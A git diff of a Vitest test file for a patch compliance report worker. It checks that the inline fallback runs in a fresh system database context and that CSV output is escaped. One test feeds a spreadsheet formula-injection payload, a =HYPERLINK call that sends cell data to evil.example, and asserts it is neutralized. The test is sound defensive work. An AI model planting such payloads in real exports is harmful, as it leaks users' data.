@@ -15,7 +15,25 @@ const state = vi.hoisted(() => ({
   updateSets: [] as Array<Record<string, unknown>>,
   redisAvailable: false,
   queueAdds: [] as Array<{ name: string; data: unknown }>,
+  queueAddError: null as Error | null,
+  updateScopes: [] as Array<string | undefined>,
 }));
+
+/**
+ * Faithful stand-in for the real DB-context helpers (#5566): the system helper
+ * EARLY-RETURNS into whatever context is already open instead of opening a
+ * fresh one, and `setImmediate` propagates the AsyncLocalStorage store out of
+ * the request handler. Modelling both with a real AsyncLocalStorage is what
+ * makes the difference between "joined the request transaction" and "opened a
+ * genuine system context" observable in a unit test.
+ */
+const dbCtx = await vi.hoisted(async () => {
+  const { AsyncLocalStorage } = await import('node:async_hooks');
+  return {
+    storage: new AsyncLocalStorage<string>(),
+    calls: [] as string[],
+  };
+});
 
 vi.mock('node:fs/promises', () => ({
   mkdir: vi.fn(),
@@ -26,6 +44,7 @@ vi.mock('bullmq', () => ({
   Job: class {},
   Queue: class {
     async add(name: string, data: unknown) {
+      if (state.queueAddError) throw state.queueAddError;
       state.queueAdds.push({ name, data });
       return { id: 'synthetic-job-id' };
     }
@@ -69,7 +88,14 @@ vi.mock('../db/schema', () => ({
 }));
 
 vi.mock('../db', () => ({
-  withSystemDbAccessContext: vi.fn(async (fn: () => Promise<unknown>) => fn()),
+  withSystemDbAccessContext: vi.fn(async (fn: () => Promise<unknown>) => {
+    dbCtx.calls.push('withSystemDbAccessContext');
+    return dbCtx.storage.getStore() ? fn() : dbCtx.storage.run('system', fn);
+  }),
+  runOutsideDbContext: vi.fn(<T>(fn: () => T): T => {
+    dbCtx.calls.push('runOutsideDbContext');
+    return dbCtx.storage.exit(fn);
+  }),
   db: {
     select: vi.fn(() => ({
       from: vi.fn((table: unknown) => table === 'reports.id' ? undefined : undefined),
@@ -118,6 +144,7 @@ import { db, withSystemDbAccessContext } from '../db';
 import { writeFile } from 'node:fs/promises';
 import {
   enqueuePatchComplianceReport,
+  formatComplianceCsv,
   processPatchComplianceReportJob,
 } from './patchComplianceReportWorker';
 
@@ -163,6 +190,13 @@ function installSelects() {
     } as never);
 }
 
+/** Drain microtask/immediate turns until the deferred inline work has settled. */
+async function flushUntil(done: () => boolean, ticks = 50): Promise<void> {
+  for (let i = 0; i < ticks && !done(); i += 1) {
+    await new Promise((resolve) => setImmediate(resolve));
+  }
+}
+
 describe('patch compliance report worker authority', () => {
   beforeEach(() => {
     vi.clearAllMocks();
@@ -181,9 +215,13 @@ describe('patch compliance report worker authority', () => {
     state.updateSets = [];
     state.redisAvailable = false;
     state.queueAdds = [];
+    state.queueAddError = null;
+    state.updateScopes = [];
+    dbCtx.calls.length = 0;
     vi.mocked(db.update).mockImplementation(() => ({
       set: vi.fn((values: Record<string, unknown>) => {
         state.updateSets.push(values);
+        state.updateScopes.push(dbCtx.storage.getStore());
         return {
           where: vi.fn(() => ({
             returning: vi.fn(async () => state.claimRows),
@@ -277,6 +315,64 @@ describe('patch compliance report worker authority', () => {
     expect(writeFile).not.toHaveBeenCalled();
   });
 
+  it('runs the Redis-down inline fallback in a fresh system context, not the request transaction', async () => {
+    state.redisAvailable = false;
+    installSelects();
+
+    await expect(
+      dbCtx.storage.run('request-org-scoped', () => enqueuePatchComplianceReport(REPORT_ID)),
+    ).resolves.toEqual({ enqueued: false });
+
+    await flushUntil(() => state.updateSets.some((v) => v.status === 'completed'));
+
+    expect(dbCtx.calls).toEqual(['runOutsideDbContext', 'withSystemDbAccessContext']);
+    expect(state.updateScopes.length).toBeGreaterThan(0);
+    expect(state.updateScopes).not.toContain('request-org-scoped');
+    expect([...new Set(state.updateScopes)]).toEqual(['system']);
+  });
+
+  it('surfaces an inline fallback failure to the caller log instead of swallowing it', async () => {
+    state.redisAvailable = false;
+    state.report = report({ executionScopeFingerprint: 'malformed' });
+    installSelects();
+    const consoleError = vi.spyOn(console, 'error').mockImplementation(() => {});
+
+    try {
+      await expect(enqueuePatchComplianceReport(REPORT_ID)).resolves.toEqual({ enqueued: false });
+      await flushUntil(() => consoleError.mock.calls.length > 0);
+
+      expect(consoleError).toHaveBeenCalledWith(
+        expect.stringContaining(`Inline report processing failed for ${REPORT_ID}`),
+        expect.any(Error),
+      );
+      expect(state.updateSets.at(-1)).toEqual(expect.objectContaining({ status: 'failed' }));
+    } finally {
+      consoleError.mockRestore();
+    }
+  });
+
+  it('falls back inline in a fresh system context when the enqueue itself throws', async () => {
+    state.redisAvailable = true;
+    state.queueAddError = new Error('queue.add exploded');
+    installSelects();
+    const consoleError = vi.spyOn(console, 'error').mockImplementation(() => {});
+
+    try {
+      await expect(
+        dbCtx.storage.run('request-org-scoped', () => enqueuePatchComplianceReport(REPORT_ID)),
+      ).resolves.toEqual({ enqueued: false });
+
+      await flushUntil(() => state.updateSets.some((v) => v.status === 'completed'));
+
+      expect(state.queueAdds).toEqual([]);
+      expect(dbCtx.calls).toEqual(['runOutsideDbContext', 'withSystemDbAccessContext']);
+      expect(state.updateScopes.length).toBeGreaterThan(0);
+      expect([...new Set(state.updateScopes)]).toEqual(['system']);
+    } finally {
+      consoleError.mockRestore();
+    }
+  });
+
   it('places only the report locator on Redis rather than serialized authority', async () => {
     state.redisAvailable = true;
 
@@ -289,5 +385,45 @@ describe('patch compliance report worker authority', () => {
       name: 'generate-compliance-report',
       data: { type: 'generate-compliance-report', reportId: REPORT_ID },
     }]);
+  });
+});
+
+describe('formatComplianceCsv', () => {
+  const summary = {
+    total: 3,
+    installed: 2,
+    pending: 1,
+    failed: 0,
+    missing: 0,
+    skipped: 0,
+    compliancePercent: 66.7,
+  };
+
+  // The compliance CSV used to hand-roll `${metric},${JSON.stringify(...)}`,
+  // bypassing the shared escaper, so a value with a leading formula trigger was
+  // emitted verbatim.
+  it('neutralizes a =HYPERLINK payload in a metric value', () => {
+    const csv = formatComplianceCsv(
+      '=HYPERLINK("https://evil.example/?c="&A1,"x")',
+      ORG_ID,
+      null,
+      null,
+      summary,
+    );
+
+    const reportIdLine = csv.split('\n').find((line) => line.startsWith('"report_id"'))!;
+    expect(reportIdLine).toBe(
+      `"report_id","'=HYPERLINK(""https://evil.example/?c=""&A1,""x"")"`,
+    );
+    expect(csv).not.toContain(',"=HYPERLINK');
+  });
+
+  it('escapes the header row and every metric name', () => {
+    const csv = formatComplianceCsv(REPORT_ID, ORG_ID, null, null, summary);
+    const lines = csv.split('\n');
+    expect(lines[0]).toBe('"metric","value"');
+    expect(lines).toContain(`"org_id","${ORG_ID}"`);
+    expect(lines).toContain('"compliance_percent","66.7"');
+    expect(lines).toContain('"source","all"');
   });
 });
